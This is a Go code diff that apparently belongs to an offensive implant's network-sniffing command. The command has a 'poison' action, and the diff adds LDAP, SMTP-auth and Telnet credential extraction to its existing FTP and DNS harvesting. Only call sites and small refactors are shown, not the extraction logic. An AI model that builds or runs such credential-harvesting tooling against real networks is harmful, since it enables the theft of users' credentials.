@@ -28,9 +28,9 @@ func sniffHtons(i uint16) uint16 {
 }
 
 func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
-	var params sniffParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := requireParams[sniffParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if params.Action == "poison" {
@@ -113,6 +113,7 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)
 
 	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
+	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
 	var pcapCollector *sniffPCAPCollector
 	if params.SavePCAP {
 		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
@@ -211,6 +212,15 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		if cred := sniffExtractDNS(payload, &meta); cred != nil {
 			result.Credentials = append(result.Credentials, cred)
 		}
+		if cred := sniffExtractLDAP(payload, &meta); cred != nil {
+			result.Credentials = append(result.Credentials, cred)
+		}
+		if cred := sniffExtractSMTPAuth(payload, &meta); cred != nil {
+			result.Credentials = append(result.Credentials, cred)
+		}
+		if cred := telnetTracker.process(payload, &meta); cred != nil {
+			result.Credentials = append(result.Credentials, cred)
+		}
 	}
 
 	result.Duration = time.Since(startTime).Truncate(time.Second).String()
@@ -254,7 +264,7 @@ func sniffAttachBPF(fd int, filter []unix.SockFilter) error {
 		0,
 	)
 	if errno != 0 {
-		return fmt.Errorf("SO_ATTACH_FILTER: %v", errno)
+		return fmt.Errorf("SO_ATTACH_FILTER: %w", errno)
 	}
 	return nil
 }
